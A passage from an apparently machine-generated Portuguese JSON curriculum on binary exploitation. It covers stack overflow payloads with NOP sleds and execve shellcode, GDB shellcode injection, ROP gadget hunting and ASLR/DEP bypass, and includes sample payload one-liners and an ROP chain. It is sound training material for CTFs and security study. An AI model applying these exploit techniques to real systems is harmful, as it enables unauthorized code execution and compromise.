                                  "materials": "Python para script de exploit, GDB.",
                                  "tips": "NOP sled longo garante slide mesmo com desalinhamento menor (± alguns bytes).",
                                  "learningObjective": "Montar exploit completo com técnicas de bypass como NOP sled.",
                                  "commonMistakes": "Endereço de retorno incorreto (little-endian: \\xaddr[::-1]), causando jump para invalid address."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Executar exploit e depurar final",
                                  "subSteps": [
                                    "Rodar programa sem gdb, injetar payload via pipe ou stdin.",
                                    "Verificar spawn de shell interativo (prompt $ ou #).",
                                    "Depurar falhas comuns com gdb (run < payload.py).",
                                    "Testar em ambiente sem proteções para confirmação 100%.",
                                    "Documentar payload final e lições aprendidas."
                                  ],
                                  "verification": "Shellcode executa, concedendo shell reverso ou bind sem crashes adicionais.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Script Python final, ambiente Linux vulnerável.",
                                  "tips": "Use 'python -c \"print payload\" | ./vuln' para execução limpa.",
                                  "learningObjective": "Executar e validar exploit end-to-end em cenário realista.",
                                  "commonMistakes": "Executar com ASLR ligado, invalidando endereços hardcodados."
                                }
                              ],
                              "practicalExample": "Em um programa vuln.c com 'char buf[100]; gets(buf);', crie payload de 112 bytes padding + 23 bytes shellcode (\\x31\\xc0...execve sh) + NOP sled de 200 bytes + endereço 0xbffffd20 (início NOP). Execute: python -c 'print \"A*112\" + shellcode + \"\\x90*200\" + \"\\x20\\xfd\\xff\\xbf\"' | ./vuln → shell spawn.",
                              "finalVerifications": [
                                "EIP sobrescrito corretamente para endereço do NOP sled.",
                                "NOP sled desliza execução para shellcode.",
                                "Shellcode executa sem crash, spawnando /bin/sh.",
                                "Exploit reproduzível em múltiplas runs sem gdb.",
                                "Nenhum bad char trunca o payload.",
                                "Alinhamento de stack confirmado via esp no gdb."
                              ],
                              "assessmentCriteria": [
                                "Precisão do offset (erro <2 bytes).",
                                "Shellcode funcional sem null bytes ou bad chars.",
                                "Payload inclui NOP sled efetivo (>100 bytes).",
                                "Endereço de retorno packed corretamente (little-endian).",
                                "Exploit succeeds em 90%+ das execuções.",
                                "Documentação clara de cálculos e gdb outputs."
                              ],
                              "crossCurricularConnections": [
                                "Assembly x86: Escrita e depuração de shellcode.",
                                "Programação C: Entendimento de stack e funções como gets/strcpy.",
                                "Ferramentas de Debugging: Uso avançado de GDB e pwntools.",
                                "Redes e Sistemas: Conceitos de ASLR, NX, stack canaries em OS.",
                                "Ética em Segurança: Discussão de uso legal em pentesting."
                              ],
                              "realWorldApplication": "Em ethical hacking e CTFs (ex: pwn challenges no HackTheBox), pentests para validar vulnerabilidades em software legado, e treinamento de desenvolvedores para implementar proteções como stack canaries e ASLR, prevenindo breaches como o Code Red worm."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.2.2.1",
                              "10.1.4.2.1.3"
                            ]
                          },
                          {
                            "id": "10.1.4.2.3.2",
                            "name": "Executar e depurar shellcodes em memória",
                            "description": "Usar gdb ou pwndbg para injetar shellcode via (gdb) set {int} $esp = endereço, executar passo a passo e observar chamadas de sistema.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o ambiente de depuração e o shellcode",
                                  "subSteps": [
                                    "Instale e configure o GDB ou pwndbg em uma VM Linux (ex: Ubuntu 20.04 com ASLR desabilitado).",
                                    "Compile um binário vulnerável simples em C que permita overflow para controle de ESP (ex: stack buffer overflow).",
                                    "Escreva ou obtenha um shellcode simples em assembly (ex: execve('/bin/sh') de ~23 bytes) e compile para bytes hex usando nasm e objdump.",
                                    "Converta o shellcode para formato utilizável no GDB (sequência de inteiros little-endian).",
                                    "Identifique o endereço de injeção esperado (ex: endereço do buffer na stack via gdb info frame)."
                                  ],
                                  "verification": "Verifique se o shellcode compila sem erros e o binário vulnerável roda sem crashes iniciais; liste bytes hex corretamente.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "GDB ou pwndbg",
                                    "nasm",
                                    "gcc",
                                    "Binário vulnerável fonte",
                                    "VM Linux com protections desabilitadas (ASLR=0, NX off)"
                                  ],
                                  "tips": "Use python -c 'print(\"\\x31\\xc0...\")' para gerar o shellcode; teste shellcode standalone com ld.",
                                  "learningObjective": "Configurar um ambiente isolado e preparar artefatos para injeção segura de shellcode.",
                                  "commonMistakes": [
                                    "Esquecer de desabilitar ASLR (echo 0 > /proc/sys/kernel/randomize_va_space)",
                                    "Shellcode com null bytes causando truncamento",
                                    "Endianness errada nos bytes"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Iniciar o GDB e configurar o ponto de quebra inicial",
                                  "subSteps": [
                                    "Execute gdb ./vulneravel ou gdb --args ./vulneravel input.",
                                    "Defina breakpoints no main e no ponto de overflow (ex: break *0x080484xx).",
                                    "Execute até o breakpoint com 'r' e examine a stack com 'x/32wx $esp' para confirmar buffer.",
                                    "Use 'disas' para ver instruções assembly ao redor do ESP controlado.",
                                    "Anote o endereço atual do ESP para injeção futura."
                                  ],
                                  "verification": "Breakpoint é atingido, stack dump mostra buffer acessível e ESP em posição esperada.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "GDB/pwndbg",
                                    "Binário vulnerável executável"
                                  ],
                                  "tips": "Carregue pwndbg com 'source /path/to/pwndbg/gdbinit.py' para visualizações melhores; use 'context registers' para overview.",
                                  "learningObjective": "Navegar no GDB para isolar o momento de controle de fluxo via stack overflow.",
                                  "commonMistakes": [
                                    "Executar sem input que triggera overflow",
                                    "Não usar 'set disable-randomization on'",
                                    "Confundir $esp com $ebp"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Injetar o shellcode em memória via manipulação de registradores",
                                  "subSteps": [
                                    "No breakpoint de overflow, limpe o buffer/RET com 'set {int} $esp += offset = 0x90909090' para NOP sled.",
                                    "Injete shellcode: 'set {int} $esp = (int)0xaddr_buffer' para apontar ESP ao início do shellcode.",
                                    "Preencha o shellcode byte a byte: ex: 'set {int} $esp = 0x31c0b0; set {int} $esp+4 = 0x3132...' ajustando offsets.",
                                    "Use script GDB para automação: 'python exec(open(\"inject.py\").read())'.",
                                    "Confirme injeção com 'x/32bx $esp' mostrando bytes corretos do shellcode."
                                  ],
                                  "verification": "Dump de memória em $esp exibe sequência exata do shellcode sem corrupções.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Script Python para injeção (opcional)",
                                    "Bytes hex do shellcode"
                                  ],
                                  "tips": "Use '{long}' para 64-bit se necessário; pwndbg 'heap' ou 'cyclic' para encontrar offsets precisos.",
                                  "learningObjective": "Manipular memória diretamente no GDB para simular injeção de shellcode em exploits reais.",
                                  "commonMistakes": [
                                    "Offsets errados causando overwrite parcial",
                                    "Formato {int} vs {short} para alinhamento",
                                    "Não alinhar ESP a 4/8 bytes"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Executar e depurar o shellcode passo a passo",
                                  "subSteps": [
                                    "Execute instrução por instrução com 'si' (stepi) ou 'ni' (nexti) a partir de $esp.",
                                    "Monitore registradores com 'info reg' ou pwndbg 'regs'; foque em EAX para syscall number.",
                                    "Observe chamadas de sistema: 'si' até 'int 0x80' ou 'syscall', note args em EBX/ECX/EDX.",
                                    "Verifique execução: shell spawna? Use 'x/s $ebx' para strings como '/bin/sh'.",
                                    "Depure falhas: ajuste shellcode para bad chars, verifique stack alignment com 'info frame'."
                                  ],
                                  "verification": "Shellcode executa até syscall final (ex: execve) sem crash, spawnando shell interativo.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "GDB com breakpoints em int 0x80/syscall"
                                  ],
                                  "tips": "Use 'finish' para sair de funções; record com 'script log' para análise posterior.",
                                  "learningObjective": "Analisar fluxo dinâmico de shellcode, identificando syscalls e depurando runtime errors.",
                                  "commonMistakes": [
                                    "Usar 'step' ao invés de 'stepi' pulando assembly",
                                    "Ignorar flags como Zero Flag em comparações",
                                    "Syscall args errados (ex: EBX não aponta string válida)"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um binário vulnerável com stack overflow, injete shellcode execve('/bin/sh') em 0xbffffxxx: set {int}0xbffffd00 = 0x31c0b00c... Após 'si' múltiplas vezes, observe EAX=0xb (execve), EBX='/bin/sh', e 'int 0x80' spawna shell.",
                              "finalVerifications": [
                                "Shellcode executa linearmente sem segfaults ou loops infinitos.",
                                "Syscalls identificadas corretamente (ex: int 0x80 com args válidos).",
                                "Registradores modificados conforme esperado (ex: EAX=syscall num).",
                                "Memória em $esp permanece intacta durante execução.",
                                "Shell interativo spawna e responde a comandos como 'whoami'.",
                                "Log GDB captura todos 'si' e dumps de reg/mem."
                              ],
                              "assessmentCriteria": [
                                "Precisão na injeção: 100% match de bytes no dump.",
                                "Análise de syscalls: Identifica pelo menos 2-3 chamadas com args.",
                                "Depuração eficaz: Resolve crashes comuns como bad chars em <5 iterações.",
                                "Documentação: Registra comandos GDB e outputs chave.",
                                "Segurança: Executa apenas em VM isolada.",
                                "Eficiência: Completa em <90 minutos totais."
                              ],
                              "crossCurricularConnections": [
                                "Assembly x86: Entendimento de instruções como mov, int, push.",
                                "Sistemas Operacionais: Syscalls Linux (man 2 execve).",
                                "Programação em C: Buffer overflows e stack layout.",
                                "Ferramentas de Dev: GDB scripting e pwndbg extensions.",
                                "Criptografia: Encoding shellcode para bypass filtros."
                              ],
                              "realWorldApplication": "Em pentesting e desenvolvimento de exploits (ex: CTFs como pwn.college, ou análise de malwares reais), depurar shellcodes ROP para bypass DEP/ASLR em binários remotos, simulando ataques como em EternalBlue ou stage-2 payloads."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.2.3.1"
                            ]
                          },
                          {
                            "id": "10.1.4.2.3.3",
                            "name": "Analisar impactos de proteções em shellcodes",
                            "description": "Discutir bypass de NX/DEP com ROP, ASLR com leaks e W^X, relacionando com análise de binários ELF/PE em engenharia reversa.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Revisar Proteções de Memória em Sistemas Operacionais",
                                  "subSteps": [
                                    "Estude NX/DEP: Entenda como impede execução de código em páginas de dados não-executáveis.",
                                    "Analise ASLR: Aprenda sobre randomização de endereços de bibliotecas e pilha.",
                                    "Examine W^X: Discuta a política Write-XOR-Execute que proíbe regiões de memória serem writable e executable simultaneamente.",
                                    "Compare implementações em ELF (Linux) vs PE (Windows).",
                                    "Identifique impactos iniciais em shellcodes tradicionais."
                                  ],
                                  "verification": "Resuma em um diagrama as proteções e seus efeitos em um shellcode simples.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Documentação oficial do Linux Kernel (NX/ASLR), MSDN para DEP, ferramentas como readelf e dumpbin.",
                                  "tips": "Use diagramas de memória para visualizar mudanças de layout causadas por ASLR.",
                                  "learningObjective": "Compreender os mecanismos fundamentais de proteções e seu impacto em injeções de código.",
                                  "commonMistakes": "Confundir NX com ASLR ou ignorar variações entre arquiteturas (x86 vs x64)."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Impacto de NX/DEP em Shellcodes e Introduzir ROP",
                                  "subSteps": [
                                    "Teste um shellcode simples em um binário vulnerável com DEP ativado e observe o crash.",
                                    "Estude ROP (Return-Oriented Programming): Colete 'gadgets' de código existente no binário.",
                                    "Construa uma cadeia ROP básica para spawnar um shell, usando pop/ret gadgets.",
                                    "Compare execução com e sem DEP em ambientes controlados.",
                                    "Discuta limitações de ROP em cenários reais."
                                  ],
                                  "verification": "Execute uma PoC ROP que bypassa DEP e spawna /bin/sh em Linux.",
                                  "estimatedTime": "1 hora",
                                  "materials": "GDB/PEDA para debugging, ROPgadget ou ROPem para encontrar gadgets, binário vulnerável como em DVWA.",
                                  "tips": "Comece com binários sem ASLR para isolar o efeito do DEP.",
                                  "learningObjective": "Dominar o bypass de NX/DEP via ROP e analisar falhas de shellcode.",
                                  "commonMistakes": "Usar gadgets inválidos ou não alinhar a pilha corretamente, causando segfaults."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar Bypass de ASLR com Information Leaks",
                                  "subSteps": [
                                    "Implemente um leak de endereço via format string ou off-by-one em um buffer overflow.",
                                    "Use o leak para calcular offsets de libc/pilha e desrandomizar ASLR.",
                                    "Integre leak com ROP chain para um exploit completo.",
                                    "Teste em ELF (ret2libc) e PE (similar com kernel32.dll).",
                                    "Avalie eficácia contra full ASLR + PIE."
                                  ],
                                  "verification": "Desenvolva um exploit que leak um endereço e usa ROP para bypassar ASLR.",
                                  "estimatedTime": "1 hora 15 minutos",
                                  "materials": "Pwntools para Python exploits, checksec.sh para verificar proteções, binários com ASLR parcial.",
                                  "tips": "Use %p em printf para leaks iniciais; normalize leaks subtraindo base conhecida.",
                                  "learningObjective": "Aprender técnicas de leak para contornar randomização de endereços.",
                                  "commonMistakes": "Não considerar ASLR de stack vs heap ou leaks parciais insuficientes."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Relacionar com Análise de Binários ELF/PE em Engenharia Reversa",
                                  "subSteps": [
                                    "Disasseble um binário ELF/PE com proteções ativadas usando objdump ou IDA Free.",
                                    "Identifique gadgets ROP e pontos de leak em funções como puts/printf.",
                                    "Simule impactos de proteções em shellcode injection via debugger.",
                                    "Documente diferenças ELF (PT_DYNAMIC) vs PE (import table) para bypasses.",
                                    "Sintetize relatório de análise de vulnerabilidades."
                                  ],
                                  "verification": "Gere um relatório com gadgets encontrados e estratégia de bypass para um binário dado.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Ghidra ou Radare2 para análise estática, binários de teste como de CTFs (ex: ROP Emporium).",
                                  "tips": "Ative verbose em ROPgadget para mais gadgets; foque em arch-specific (ROP em ARM difere).",
                                  "learningObjective": "Integrar análise reversa para avaliar impactos e planejar bypasses em binários reais.",
                                  "commonMistakes": "Ignorar relocações em PIE ou seções NX em PE."
                                }
                              ],
                              "practicalExample": "Em um desafio CTF com buffer overflow em binário ELF x86-64 com DEP e ASLR parcial: 1) Leak endereço de libc via printf; 2) Calcule base; 3) ROP chain com gadgets de system e '/bin/sh' para root shell.",
                              "finalVerifications": [
                                "Explicar verbalmente como ROP contorna NX sem executar shellcode direto.",
                                "Demonstrar leak de ASLR em GDB e calcular offset correto.",
                                "Analisar um binário PE/ELF e listar 5 gadgets ROP viáveis.",
                                "Discutir por que W^X complica ROP chains longas.",
                                "Simular falha de shellcode tradicional vs sucesso com bypasses."
                              ],
                              "assessmentCriteria": [
                                "Precisão técnica na descrição de cada proteção e bypass (90%+ acurácia).",
                                "Capacidade de construir e depurar PoC funcional em ambiente controlado.",
                                "Profundidade na análise de binários ELF/PE, identificando seções relevantes.",
                                "Clareza em relacionar impactos a cenários reais de exploração.",
                                "Criatividade em handling edge cases como full ASLR + Canary."
                              ],
                              "crossCurricularConnections": [
                                "Engenharia Reversa: Disassembly e análise estática de gadgets.",
                                "Programação em Assembly: Entender instruções RET/POP para ROP.",
                                "Segurança de Software: Mitigações modernas como CFI/Control-Flow Integrity.",
                                "Redes e Sistemas: Impacto em exploits remotos via protocolos."
                              ],
                              "realWorldApplication": "Em pentests e análise de malware, permite auditar binários vulneráveis, desenvolver exploits para proof-of-concept em relatórios de segurança, e recomendar mitigações como RELRO full ou ET_EXEC desabilitado."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.2.3.2"
                            ]
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.4.3",
                    "name": "Return-Oriented Programming (ROP)",
                    "description": "Método avançado que combina 'gadgets' de código existente em bibliotecas para executar comportamento arbitrário, contornando proteções como DEP/NX.",
                    "individualConcepts": [
                      {
                        "id": "10.1.4.3.1",
                        "name": "Gadgets em ROP",
                        "description": "Gadgets são pequenos fragmentos de código extraídos do binário ou bibliotecas carregadas (como libc), compostos por sequências de instruções que terminam com uma instrução RET (0xC3 em x86), permitindo o controle do fluxo de execução por meio de retornos sucessivos.",
                        "specificSkills": [
                          {
                            "id": "10.1.4.3.1.1",
                            "name": "Identificar gadgets em binários ELF e PE",
                            "description": "Usar ferramentas como ROPgadget ou objdump para escanear e listar gadgets válidos em assembly x86/x64, filtrando por operações como pop/ret, mov e chamadas de sistema, considerando alinhamento de pilha e registradores.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o ambiente de análise",
                                  "subSteps": [
                                    "Instale o ROPgadget via pip: pip install ropgadget.",
                                    "Instale objdump (parte do binutils para Linux ou MinGW para Windows).",
                                    "Baixe binários de exemplo: um ELF simples (ex: challenge.elf) e um PE (ex: challenge.exe) de repositórios como Exploit-DB.",
                                    "Verifique a arquitetura: use file ou objdump -f para confirmar x86/x64.",
                                    "Configure um diretório de trabalho com permissões de execução."
                                  ],
                                  "verification": "Execute ROPgadget --help e objdump --version sem erros.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Python 3+",
                                    "Binutils ou MinGW",
                                    "Binários ELF/PE de exemplo"
                                  ],
                                  "tips": "Use um VM isolado como Ubuntu para evitar conflitos com Windows PE tools.",
                                  "learningObjective": "Preparar ferramentas essenciais para análise de gadgets ROP.",
                                  "commonMistakes": [
                                    "Não verificar arquitetura (32 vs 64-bit)",
                                    "Instalar ferramentas sem dependências como capstone"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Escanear gadgets em binário ELF",
                                  "subSteps": [
                                    "Execute ROPgadget --binary challenge.elf para listar todos os gadgets.",
                                    "Analise a saída: identifique gadgets como 'pop rdi; ret' ou 'int 0x80'.",
                                    "Use ROPgadget --binary challenge.elf --string 'pop' para filtrar por operações específicas.",
                                    "Salve a saída em arquivo: ROPgadget --binary challenge.elf > elf_gadgets.txt.",
                                    "Compare com objdump -d challenge.elf para validar em assembly."
                                  ],
                                  "verification": "Liste pelo menos 5 gadgets válidos como pop/ret em elf_gadgets.txt.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "ROPgadget",
                                    "objdump",
                                    "Binário ELF de exemplo"
                                  ],
                                  "tips": "Filtre por '--only \"pop|ret|mov\"' para focar em primitives comuns.",
                                  "learningObjective": "Identificar e listar gadgets ROP em formatos ELF usando ferramentas automatizadas.",
                                  "commonMistakes": [
                                    "Ignorar gadgets inválidos devido a bad chars",
                                    "Não notar endianness em x86"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Escanear gadgets em binário PE",
                                  "subSteps": [
                                    "Execute ROPgadget --binary challenge.exe para PE (suportado nativamente).",
                                    "Use objdump -d -M intel challenge.exe para disassembly manual se necessário.",
                                    "Filtre gadgets: ROPgadget --binary challenge.exe --only 'pop|ret|syscall'.",
                                    "Identifique chamadas de sistema como 'mov eax, 0x3b; int 0x2e' (Windows).",
                                    "Exporte: ROPgadget --binary challenge.exe --outfile pe_gadgets.txt."
                                  ],
                                  "verification": "Obtenha lista de gadgets PE com pelo menos 3 pop/ret e 1 syscall.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "ROPgadget",
                                    "objdump com suporte PE",
                                    "Binário PE de exemplo"
                                  ],
                                  "tips": "Para PE em Linux, use wine ou pefile Python lib como auxiliar.",
                                  "learningObjective": "Aplicar ROPgadget a binários PE e correlacionar com disassembly.",
                                  "commonMistakes": [
                                    "Confundir syscalls Windows (int 0x2e) com Linux",
                                    "Não lidar com ASLR/relocs"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Filtrar, analisar e validar gadgets",
                                  "subSteps": [
                                    "Filtre por alinhamento: priorize gadgets com ret alinhado a 4/8 bytes.",
                                    "Analise registradores: verifique dependências como pop rdi; ret para argumentos.",
                                    "Teste validade: use ROPgadget --chain para gerar chains simples.",
                                    "Considere contexto: gadgets com mov para stack/pilha alignment.",
                                    "Documente: crie tabela com gadget address, opcode, registers affected."
                                  ],
                                  "verification": "Crie um relatório com 10 gadgets filtrados, incluindo análise de alinhamento.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Saídas de ROPgadget",
                                    "Editor de texto ou spreadsheet"
                                  ],
                                  "tips": "Use --depth 10 para chains mais complexos, mas comece simples.",
                                  "learningObjective": "Avaliar utilidade de gadgets considerando pilha e registradores em ROP.",
                                  "commonMistakes": [
                                    "Overlook gadgets com side-effects como calls indesejadas",
                                    "Ignorar null bytes em payloads"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Verificação avançada e prática integrada",
                                  "subSteps": [
                                    "Simule stack em GDB: carregar binário e pular para gadgets manualmente.",
                                    "Teste filtro custom: grep 'pop.*ret' em dumps de ROPgadget.",
                                    "Compare ELF vs PE: note diferenças em syscalls (execve vs CreateProcess).",
                                    "Gere chain exemplo: ROPgadget --chain 3 para pop+pop+sys.",
                                    "Salve relatório final com screenshots de outputs."
                                  ],
                                  "verification": "Execute um chain de 3 gadgets em GDB sem crash.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "GDB ou WinDbg",
                                    "Binários de exemplo"
                                  ],
                                  "tips": "Use 'gef' plugin no GDB para visualização ROP-friendly.",
                                  "learningObjective": "Integrar análise estática com verificação dinâmica de gadgets.",
                                  "commonMistakes": [
                                    "Não alinhar stack pointer (rsp % 8 == 0)",
                                    "Testar em ASLR enabled sem disable"
                                  ]
                                }
                              ],
                              "practicalExample": "Baixe 'ret2csu' ELF de picoCTF. Execute ROPgadget --binary ret2csu --only 'pop|ret'. Encontre 'pop rsi; pop r15; ret' em 0x4005a3. Filtre para sys_execve chain: combine com pop rdi; ret e int 0x80 para spawn /bin/sh.",
                              "finalVerifications": [
                                "Lista de 20+ gadgets únicos de ELF e PE com endereços e opcodes.",
                                "Relatório filtrado por pop/ret/mov/syscall com análise de registradores.",
                                "Chain ROP de 4 gadgets gerado e validado em GDB.",
                                "Diferenças notadas entre ELF (Linux syscalls) e PE (Windows).",
                                "Tabela de alinhamento: todos gadgets ret alinhados.",
                                "Sem erros em comandos ROPgadget/objdump."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação: 90% gadgets listados são válidos.",
                                "Cobertura de filtros: Pelo menos 3 tipos (pop, mov, syscall).",
                                "Análise de contexto: Considera alinhamento e registradores em 80% dos gadgets.",
                                "Uso correto de ferramentas: Sem erros de sintaxe ou formato.",
                                "Relatório completo: Inclui exemplos práticos e verificações.",
                                "Criatividade em chains: Gera pelo menos um chain funcional."
                              ],
                              "crossCurricularConnections": [
                                "Assembly x86/x64: Leitura de disassembly e opcodes.",
                                "Sistemas Operacionais: Diferenças ELF/PE e syscalls Linux/Windows.",
                                "Engenharia Reversa: Uso de objdump/GDB para análise binária.",
                                "Programação em C/Python: Scripts para automação de filtros ROP.",
                                "Criptografia/Segurança: Contexto de mitigações como ASLR/DEP."
                              ],
                              "realWorldApplication": "Em pentests e CTFs, identificar gadgets ROP permite bypass de NX/DEP para exploits shellcode-less, como em vulnerabilidades buffer overflow em serviços reais (ex: web servers vulneráveis)."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.3.1.2",
                            "name": "Analisar propriedades de gadgets",
                            "description": "Examinar gadgets para operações primitivas (POP para carregar valores na pilha, arithmetic ops para manipulação de dados) e gadgets compostos (que incluem chamadas a funções como system() ou mprotect()), avaliando endereços ASLR-proof.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Identificar Gadgets Primitivos em um Binário",
                                  "subSteps": [
                                    "Use ferramentas como ROPgadget ou objdump para extrair gadgets do binário desmontado.",
                                    "Filtre gadgets que terminam com RET (0xc3) para chains seguras.",
                                    "Liste operações primitivas: POP (carrega valores na pilha), PUSH, MOV, arithmetic ops (ADD, SUB, MUL).",
                                    "Registre endereços de gadgets como POP RDI; RET.",
                                    "Verifique alinhamento da pilha pós-gadget."
                                  ],
                                  "verification": "Lista de pelo menos 10 gadgets primitivos com endereços e disassembly correta.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Binário alvo (ex: vulnerable ELF), ROPgadget, gdb, objdump.",
                                  "tips": "Comece com arquitetura x86-64; foque em registradores úteis como RAX, RDI.",
                                  "learningObjective": "Reconhecer e extrair gadgets primitivos para manipulação básica de registradores e pilha.",
                                  "commonMistakes": "Ignorar gadgets que alteram flags ou têm side-effects inesperados."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Operações e Dependências de Gadgets Primitivos",
                                  "subSteps": [
                                    "Examine o disassembly para entender fluxo: o que POP carrega e em qual registrador.",
                                    "Teste em GDB: defina breakpoints e simule execução com valores controlados na pilha.",
                                    "Avalie arithmetic ops: verifique overflow/underflow e precisão.",
                                    "Documente dependências: registradores de input/output, tamanho da pilha consumida.",
                                    "Classifique por utilidade: stack pivot, register setup."
                                  ],
                                  "verification": "Relatório com análise de 5 gadgets primitivos, incluindo input/output e side-effects.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "GDB com pwndbg, binário com PIE/ASLR desabilitado inicialmente.",
                                  "tips": "Use 'gef-pwndbg' para visualização de pilha; teste com payloads simples.",
                                  "learningObjective": "Compreender impactos precisos de gadgets primitivos em estado da CPU/pilha.",
                                  "commonMistakes": "Assumir que POP sempre popa um valor sem checar registrador destino."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar e Dissecar Gadgets Compostos",
                                  "subSteps": [
                                    "Busque gadgets com chamadas: system(), mprotect(), execve() via ROPgadget --string 'system'.",
                                    "Analise sequência interna: setup de args, CALL, possível RET.",
                                    "Verifique handling de return value e limpeza da pilha.",
                                    "Identifique gadgets com múltiplas instruções: ex. XOR RAX,RAX; POP RDI; CALL system.",
                                    "Note convenções de chamada: args em RDI, RSI, etc."
                                  ],
                                  "verification": "Descrição detalhada de 3 gadgets compostos com fluxograma de execução.",
                                  "estimatedTime": "50 minutos",
                                  "materials": "ROPgadget com opções --binary, strings do binário, Radare2 para análise profunda.",
                                  "tips": "Procure por gadgets que zeram registradores antes de CALL para evitar crashes.",
                                  "learningObjective": "Diferenciar e analisar gadgets compostos para execução de funções win.",
                                  "commonMistakes": "Não considerar alinhamento de pilha para CALLs (deve ser 16-byte aligned)."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Avaliar Robustez de Endereços contra ASLR",
                                  "subSteps": [
                                    "Identifique leaks info: use gadgets para ler got/plt e calcular bases.",
                                    "Teste com ASLR ativado: compare endereços em runs múltiplos.",
                                    "Prefira gadgets relativos ou em seções fixas (ex: .text base leak).",
                                    "Calcule offsets ASLR-proof: subtraia base do binário/lib.",
                                    "Valide em exploit: chain funcione independentemente de randomização."
                                  ],
                                  "verification": "Exploit proof-of-concept que usa gadgets ASLR-proof em ambiente randomizado.",
                                  "estimatedTime": "75 minutos",
                                  "materials": "Binário com ASLR/PIE, checksec.sh, pwntools para scripting.",
                                  "tips": "Leak libc base via puts@plt + one_gadget para confirmação.",
                                  "learningObjective": "Garantir chains ROP resilientes a mitigações modernas como ASLR.",
                                  "commonMistakes": "Usar endereços absolutos sem leak, falhando em ASLR real."
                                }
                              ],
                              "practicalExample": "Em um CTF challenge com binário 'vuln', use ROPgadget para encontrar POP RDI; RET em 0x40123c, chain com system('/bin/sh') leakando libc base via puts para ASLR bypass: payload = p64(pop_rdi) + p64(binsh_addr) + p64(system_addr).",
                              "finalVerifications": [
                                "Lista completa de 15+ gadgets (primitivos e compostos) com endereços corretos.",
                                "Análise documentada de dependências e side-effects para todos gadgets selecionados.",
                                "Exploit funcional em GDB com ASLR off e on, executando shell.",
                                "Offsets calculados corretamente para pelo menos 3 bibliotecas (main, libc).",
                                "Nenhum crash em chains devido a desalinhamento ou bad chars.",
                                "Relatório com screenshots de GDB mostrando estado da pilha/regs."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação: 90%+ gadgets válidos sem falsos positivos.",
                                "Profundidade de análise: Todas dependências e side-effects cobertas.",
                                "Robustez ASLR: Exploit roda em 5/5 execuções randomizadas.",
                                "Eficiência da chain: Menos de 20 gadgets para shell spawn.",
                                "Documentação: Clara, com diagramas e código exploit incluído.",
                                "Criatividade: Uso otimizado de gadgets compostos para redução de payload."
                              ],
                              "crossCurricularConnections": [
                                "Assembly e Arquitetura: Leitura de disassembly x86-64.",
                                "Sistemas Operacionais: Convenções de chamada ABI, mitigações ASLR/PIE.",
                                "Programação Competitiva: Scripting exploits com pwntools/Python.",
                                "Criptografia: Análise de binários para crypto primitives em ROP."
                              ],
                              "realWorldApplication": "Em pesquisa de vulnerabilidades (ex: Google Project Zero), desenvolver exploits ROP para bypass de NX/DEP em binários reais como browsers ou servers, ou em CTFs/red teaming para gain shell em sistemas comprometidos."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.3.1.3",
                            "name": "Diferenciar gadgets em 32 e 64 bits",
                            "description": "Comparar gadgets em arquiteturas x86 (32 bits, com ESP/EBP) e x64 (64 bits, com RSP/RBP e convenções de chamadas AMD64), identificando impactos em ROP chains devido a tamanhos de ponteiros e registradores.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a arquitetura x86 de 32 bits e registradores chave para ROP",
                                  "subSteps": [
                                    "Estude o layout de pilha em x86 32-bit: EIP, ESP, EBP.",
                                    "Identifique registradores de 32 bits: EAX, EBX, ECX, EDX, ESI, EDI, EBP, ESP.",
                                    "Aprenda convenções de chamada: stdcall, cdecl (argumentos na stack, retorno em EAX).",
                                    "Examine gadgets básicos como 'pop reg; ret' que manipulam ESP.",
